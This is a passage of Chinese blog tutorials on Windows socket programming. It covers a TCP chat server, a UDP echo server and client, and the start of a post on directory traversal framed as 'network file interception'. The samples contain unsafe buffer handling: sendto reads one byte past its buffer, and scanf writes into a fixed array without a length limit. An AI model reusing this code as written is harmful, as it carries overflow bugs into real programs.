<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Server</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKET sockSrv = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == sockSrv)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSrv, (SOCKADDR*)&amp;addrSrv, <span class="built_in">sizeof</span>(SOCKADDR)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSrv, <span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKADDR_IN addrCli;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		SOCKET sockConn = <span class="built_in">accept</span>(sockSrv, (SOCKADDR*)&amp;addrCli, &amp;len);</span><br><span class="line">		<span class="keyword">if</span> (sockConn == SOCKET_ERROR)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="comment">//创建socket，从sockSrv中获取连接上的socket信息，并将对应的IP和端口置入addrCli</span></span><br><span class="line">		<span class="built_in">sprintf_s</span>(sendBuf, <span class="number">100</span>, <span class="string">&quot;Welcome %s to China!\n&quot;</span>, <span class="built_in">inet_ntoa</span>(addrCli.sin_addr));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, sendBuf);</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> iLen = <span class="built_in">send</span>(sockConn, sendBuf, <span class="built_in">strlen</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (iLen == SOCKET_ERROR)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">				<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">memset</span>(sendBuf, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">			<span class="built_in">memset</span>(recvBuf, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">			iLen = <span class="built_in">recv</span>(sockConn, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (iLen == SOCKET_ERROR)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">				<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;RecvBuf : %s\nsend: &quot;</span>, recvBuf);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, sendBuf);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">closesocket</span>(sockConn);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">closesocket</span>(sockSrv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_7-UDP%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/">7-UDP网络编程服务器</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="UDP网络编程服务器">UDP网络编程服务器</h2>
+<blockquote>
+<p>与TCP相比，UDP无需listen，服务器直接在recvfrom处阻塞，等待客户端连接</p>
+</blockquote>
+<p><img src="picture/UDP%E5%92%8CTCP%E7%BC%96%E7%A8%8B%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt=""></p>
+<h4 id="1-初始化网络库">1.初始化网络库</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsadata;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>创建socket</strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SOCKET sockSrv;</span><br><span class="line">sockSrv = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);		<span class="comment">//注意，此处使用SOCK_DGRAM，即UDP方式</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSrv)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;socket err : %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-bind">2.bind</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SOCKADDR_IN addrSrv;</span><br><span class="line">addrSrv.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSrv.sin_family = AF_INET;</span><br><span class="line">addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">6001</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSrv, (SOCKADDR*)&amp;addrSrv, <span class="built_in">sizeof</span>(SOCKADDR)))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bind err : %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-recvfrom和sendto函数">3.recvfrom和sendto函数</h4>
+<p>recvfrom参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>SOCKET s：服务器SOCKET（不同于TCP：需要创建一个分机SOCKET去处理。UDP直接使用服务器socket本身去接收数据）</p>
+</li>
+<li class="lvl-2">
+<p>char* buf：接收的缓冲区，一般创建一个固定大小的数组来接收。</p>
+</li>
+<li class="lvl-2">
+<p>int len：缓冲区的最大长度</p>
+</li>
+<li class="lvl-2">
+<p>int flags：默认填0</p>
+</li>
+<li class="lvl-2">
+<p>sockaddr* from：数据来源，与bind时的参数一致，即(SOCKADDR*)&amp;addrSrv</p>
+</li>
+<li class="lvl-2">
+<p>int* fromlen：地址结构体的大小，且必须是一个指针，提前用len = sizeof(SOCKADDR)求出，再填入len即可。</p>
+</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SOCKADDR_IN addrCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">recvfrom</span>(sockSrv, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrCli, &amp;len);</span><br><span class="line">	cout &lt;&lt; recvBuf &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">sprintf_s</span>(sendBuf, <span class="number">100</span>, <span class="string">&quot;Ack:%s&quot;</span>, recvBuf);	<span class="comment">//将接收到的内容直接发回去</span></span><br><span class="line">	<span class="built_in">sendto</span>(sockSrv, sendBuf, <span class="built_in">sizeof</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrCli, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="完整代码">完整代码</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Server&quot;</span> &lt;&lt; endl;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKET sockSrv;</span><br><span class="line">	sockSrv = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == sockSrv)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket err : %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9988</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSrv, (SOCKADDR*)&amp;addrSrv, <span class="built_in">sizeof</span>(SOCKADDR)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind err : %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	SOCKADDR_IN addrCli;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">	<span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">recvfrom</span>(sockSrv, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrCli, &amp;len);</span><br><span class="line">		cout &lt;&lt; recvBuf &lt;&lt; endl;</span><br><span class="line">		<span class="built_in">sprintf_s</span>(sendBuf, <span class="number">100</span>, <span class="string">&quot;Ack:%s&quot;</span>, recvBuf);	<span class="comment">//将接收到的内容直接发回去</span></span><br><span class="line">		<span class="built_in">sendto</span>(sockSrv, sendBuf,<span class="built_in">sizeof</span>(sendBuf)+ <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrCli, len);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">closesocket</span>(sockSrv);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_8-UDP%E5%AE%A2%E6%88%B7%E7%AB%AF/">8-UDP客户端</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="UDP客户端">UDP客户端</h2>
+<h4 id="1-初始化网络库">1.初始化网络库</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsadata;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-创建SOCKET">2.创建SOCKET</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SOCKET sockCli;</span><br><span class="line">sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;socket err : %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-收发数据">3.收发数据</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sendto</span>(sockCli, sendBuf, <span class="built_in">sizeof</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrSrv, len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">recvfrom</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrSrv, &amp;len);</span><br></pre></td></tr></table></figure>
+<h4 id="完整代码">完整代码</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Client&quot;</span> &lt;&lt; endl;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKET sockCli;</span><br><span class="line">	sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == sockCli)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket err : %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9988</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sendto</span>(sockCli, sendBuf, <span class="built_in">sizeof</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrSrv, len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">recvfrom</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrSrv, &amp;len);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; recvBuf &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_9-%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E6%88%AA%E5%8F%96%EF%BC%9A%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/">9-网络文件截取：文件遍历</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="网络文件截取：文件遍历">网络文件截取：文件遍历</h2>
+<h4 id="1-window下的文件结构体：WIN32-FIND-DATA">1.window下的文件结构体：WIN32_FIND_DATA</h4>
+<blockquote>
+<p>定义如下，分别为文件</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WIN32_FIND_DATAW</span> &#123;</span><br><span class="line">    DWORD dwFileAttributes;			<span class="comment">//属性</span></span><br><span class="line">    FILETIME ftCreationTime;		<span class="comment">//创建时间</span></span><br><span class="line">    FILETIME ftLastAccessTime;		<span class="comment">//最后一次访问时间</span></span><br><span class="line">    FILETIME ftLastWriteTime;		<span class="comment">//最后一次写入时间</span></span><br><span class="line">    DWORD nFileSizeHigh;			<span class="comment">//文件大小的高位</span></span><br><span class="line">    DWORD nFileSizeLow;				<span class="comment">//文件大小的低位</span></span><br><span class="line">    DWORD dwReserved0;				<span class="comment">//保留字</span></span><br><span class="line">    DWORD dwReserved1;				<span class="comment">//保留字</span></span><br><span class="line">    _Field_z_ WCHAR  cFileName[ MAX_PATH ];			<span class="comment">//文件名</span></span><br><span class="line">    _Field_z_ WCHAR  cAlternateFileName[ <span class="number">14</span> ];		<span class="comment">//改变之后的文件名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-找到第一个文件">2.找到第一个文件</h4>
+<blockquote>
+<p>使用FindFirstFile来找到指定路径下的第一个文件</p>
+</blockquote>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>指定路径</p>
+</li>
+<li class="lvl-2">
+<p>存储找到的文件信息的结构体地址（WIN32_FIND_DATA）</p>
+</li>
+</ul>
+<p>返回值：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>找到的文件句柄</p>
+</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HANDLE hListFile;						<span class="comment">//用句柄来标志文件</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(szFilePath, szPath);</span><br><span class="line"><span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);</span><br><span class="line"><span class="comment">//找到第一个文件</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;file_for_find);</span><br></pre></td></tr></table></figure>
+<h4 id="3-根据找到的第一个文件的句柄找到下一个文件">3.根据找到的第一个文件的句柄找到下一个文件</h4>
+<blockquote>
+<p>使用FindNextFile函数找到对应句柄目录下的下一个文件</p>
+</blockquote>
+<p>参数：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>文件句柄</p>
+</li>
+<li class="lvl-2">
+<p>存储找到的文件信息的结构体地址（WIN32_FIND_DATA）</p>
+</li>
+</ul>
+<p>返回值：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>BOOL：下一个文件存在</p>
+</li>
+</ul>
